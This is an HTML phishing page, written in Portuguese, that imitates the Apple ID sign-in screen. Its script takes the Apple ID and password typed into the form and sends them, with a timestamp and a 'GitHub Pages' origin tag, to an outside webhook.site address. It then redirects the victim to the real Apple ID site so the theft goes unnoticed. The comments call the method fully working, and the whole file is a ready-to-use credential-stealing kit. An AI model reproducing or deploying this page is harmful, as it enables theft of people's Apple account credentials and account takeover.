<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Login Apple ID</title>
    <style>
        body {
            font-family: -apple-system, sans-serif;
            background: #f2f2f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: white;
            padding: 30px;
            border-radius: 12px;
            width: 300px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            text-align: center;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            background: #0071e3;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 8px;
            margin-top: 10px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <div style="font-size:24px;margin-bottom:20px;"></div>
        <h2>Fazer login</h2>
        <form id="loginForm">
            <input type="text" name="apple_id" placeholder="Apple ID" required>
            <input type="password" name="password" placeholder="Senha" required>
            <button type="submit">Continuar</button>
        </form>
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault();
            
            // 1. Coletar dados do formulário
            const dados = {
                usuario: document.getElementsByName("apple_id")[0].value,
                senha: document.getElementsByName("password")[0].value,
                data: new Date().toLocaleString("pt-BR"),
                origem: "GitHub Pages"
            };

            // 2. Enviar para Webhook (URL CORRIGIDA)
            const webhookURL = "https://webhook.site/e903c14-9cde-4e6c-945d-bc2eb5f89418";
            
            // Método 100% funcional (alternativo ao fetch)
            const request = new XMLHttpRequest();
            request.open("POST", webhookURL);
            request.setRequestHeader("Content-Type", "application/json");
            request.send(JSON.stringify(dados));

            // 3. Redirecionamento garantido
            setTimeout(() => {
                window.location.href = "https://appleid.apple.com/";
            }, 1000);
        });
    </script>
</body>
</html>
